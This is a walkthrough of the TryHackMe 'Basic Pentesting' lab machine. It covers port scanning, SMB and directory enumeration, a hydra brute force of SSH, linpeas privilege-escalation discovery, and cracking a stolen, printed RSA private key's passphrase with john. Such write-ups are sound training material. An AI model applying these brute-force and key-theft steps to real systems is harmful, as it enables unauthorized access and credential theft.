---
title: TryHackMe Basic Pentesting [CHALLENGE]
author: iamjirho
date: 2024-03-05 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/99c72676aab814b94e3bc350ba627b71.png
---
This is a machine that allows you to practice web app hacking and privilege escalation. You will also be able to use various pentesting tools learn different methodologies

## **Reconnaissance**

```bash
nmap -Pn -n -sV -sC -p- 10.10.41.86 --open
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-11 01:40 EST
Nmap scan report for 10.10.41.86
Host is up (0.38s latency).
Not shown: 58752 closed tcp ports (conn-refused), 6777 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http               Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn        Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  etbios-.����@ Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13              Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http               Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-11T06:42:49
|_  start_date: N/A
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-02-11T01:42:48-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.15 seconds
```

## **To-TRY List**
---
- 80 HTTP
    - Web server is running, we can try accessing that
    - Enumerate the directories either manually or automatically.
- 445 SMB
    - We can try using enum4linux to enumerate the SMB share
    - We can try an anonymous login
    - 
- 22 SSH
    - We need some credentials to access this and bruteforcing can take a really long time before the credentials can be cracked. Hence, this is the least of our priorities for pentesting.

## **Enumeration**
---

### 80 HTTP

Before anything else, let us first check how the website looks like.

![Desktop View](/assets/images/basic-pentesting/website.png){: width="972" height="589" }

Inspecting the source code isn't helpful either.

![Desktop View](/assets/images/basic-pentesting/source-code.png){: width="972" height="589" }

Now let us scan what other directories can this website give us using **`gobuster`**
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t20
```
**`gobuster dir`**: Initiates Gobuster in directory/file enumeration mode.

**`u http://<TARGET_IP>`**: Specifies the target URL.

**`w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`**: Sets the wordlist to be used for brute-forcing common directory and file names. The specified file contains a list of potential paths to check.

**`t20`**: Configures the number of concurrent threads to use during the scan (in this case, 20 threads).

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.41.86
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.41.86/development/]
```
<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> We can see the `/development` directory.
{: .prompt-tip }
<!-- markdownlint-restore -->
The **`/development`** directory gave us 301 web response code that indicates a web-redirect that we can be able to access. Now let us try visiting it.

![Desktop View](/assets/images/basic-pentesting/development.png){: width="972" height="589" }

Interesting! The directory contain some plaintexts which could be another clue to the puzzle.

![Desktop View](/assets/images/basic-pentesting/dev.png){: width="972" height="589" }

Reading the dev.txt file, there's a conversation between J and K. The initial message confirms that Apache has been successfully set up, confirming Nmap's detection of Apache running. The subsequent message mentions the setup of SMB as well. The final message hints at a possible software version of 2.5.12.

![Desktop View](/assets/images/basic-pentesting/j.png){: width="972" height="589" }

The j.txt file contains a brief message to the user J, advising them that their password is extremely weak.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> We can infer that having a weak password is somehow a clue for password bruteforcing for SSH. But we do not know who J and K is yet.
{: .prompt-tip }
<!-- markdownlint-restore -->

Perhaps, enumerating  SMB shares would give us additional information for the list of username or clues.

### 445 SMB

```python
smbclient -L $IP
```

```text
Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2
```
The command **`smbclient -L $IP`** is used to list the shares available on a remote SMB (Server Message Block) server, where $IP represents the IP address of the server and it seems like we have an anonymous access.

```bash
smbclient \\\\10.10.170.213\\anonymous
```

![Desktop View](/assets/images/basic-pentesting/smb-anon.png){: width="972" height="589" }

Let's get that file to our attacking machine.

```bash
get <FILENAME>
```

Upon viewing.

```python
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Now we got an idea who J and K from the plaintexts we saw earlier.
{: .prompt-tip }
<!-- markdownlint-restore -->

Alternatively, we can use **`enum4linux`** for an automated approach, streamlining the process by scanning the network, identifying SMB clients, and retrieving detailed information about their configurations, shares, users, and potential vulnerabilities. 

This automated enumeration saves time and effort while providing a comprehensive overview of the SMB clients present on the network.
```elm
enum4linux -a <TARGET_IP> | tee smbscan.txt
```

**`enum4linux -a 10.10.178.216`**: Initiates **enum4linux** with the **`a`** flag, which performs all available enumeration tasks. The target IP address is **`10.10.178.216`**.

**`| tee smbscan.txt`**: The pipe (**`|`**) symbol redirects the output of the previous command to the **`tee`** command. **`tee`** simultaneously displays the output on the screen and writes it to a file named **`smbscan.txt`**.

```bash
-------

[V] Attempting to get Password Policy info with command: rpcclient -W 'WORKGROUP' -U''%'' '10.10.199.29' -c "getdompwinfo" 2>&1                              

[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5
                                                                                                                                                                                                                                                                                                                      
 ==================( Users on 10.10.199.29 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                              
----                                                                                                                                                             
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                     
S-1-22-1-1001 Unix User\jan (Local User)
```

## **Gaining an Initial Foothold**

We have a list of usernames that we can use to login via SSH. However, it is not enough since we do not have any password yet. We can try using hydra to bruteforce the password.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -vv ssh://10.10.199.29 | tee /home/kali/Documents/basic-pentesting/hydra.log
```

**`hydra`**: Initiates Hydra, a powerful password-cracking tool.

**`l jan`**: Specifies the username to be tested (in this case, “jan”).

**`P /usr/share/wordlists/rockyou.txt`**: Sets the path to the wordlist file containing potential passwords (here, the famous “rockyou.txt” wordlist).

**`vv`**: Increases verbosity, providing detailed output during the attack.

**`ssh://10.10.199.29`**: Specifies the SSH service on the target IP address (10.10.199.29).

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> I think you should try that for yourself
{: .prompt-warning }
<!-- markdownlint-restore -->

We can now login via SSH. Enter the passowrd once prompt.

### 22 SSH
```bash
ssh jan@<MACHINE_IP>
```

## **Privilege Escalation**

We can use `linpeas` to search for possible local privilege escalation path. 

See peass-ng Kali Linux Tools <https://www.kali.org/tools/peass-ng/>

Copy linpeas to target machine

```bash
scp /usr/share/peass/linpeas/linpeas.sh jan@10.10.199.29:/dev/shm
```

Change to executable permission and run on the TARGET MACHINE

```bash
chmod 755 linpeas.sh
./linpeas.sh | tee linpeaslog.txt
```

linpeas result

```text
--- redacted ---

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                            
                                                                                                                                       
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa

══╣ Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
```

We can navigate to that folder and copy the private key to our attack machine

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```

Change the owner to permission to `READ`and `WRITE`

```bash
chmod 600 kay_id_rsa
```

Login via SSH using the private key

```bash
ssh -i kay_id_rsa kay@10.10.199.29
```

```bash
┌──(kali㉿kali)-[~/Documents/basic-pentesting]
└─$ ssh -i kay_id_rsa kay@10.10.3.111
Enter passphrase for key 'kay_id_rsa':
```

It is password protected. We can try bruteforcing the passphrase using `John`

```bash
/usr/share/john/ssh2john.py kay_id_rsa > john-kay-compatible.txt
```

When you have an **SSH private key** (such as an **`id_rsa`** file) that is **passphrase-protected**, **ssh2john** steps in. It converts the private key into a **hash format** that John the Ripper can work with. Essentially, it transforms the key-file into a **textual representation** suitable for cracking by comparing hashes.

Let’s get rippin!

```bash
john john-kay-compatible.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
┌──(kali㉿kali)-[~/Documents/basic-pentesting]
└─$ john john-kay-compatible.txt --show                                            
kay_id_rsa:beeswax

1 password hash cracked, 0 left
```

## FLAG
![Desktop View](/assets/images/basic-pentesting/root.png){: width="972" height="589" }

## TAKE AWAY CONCEPTS

- Use enum4linx for enumerating SAMBA shares
- Using linpeas for extracting possible privilege escalation openings
- You need to make linpeas an `EXECUTABLE` before running it on the target machine
- Change the permission of private key to `READ` and `WRITE` before it can be used for loggin in

## VULNERABILITIES FOUND

- Exposed SSH Private Keys
- SMB Anonymous Login
- Exposed Open ports
- Exposed Plaintext on the server
- Weak Password Policy




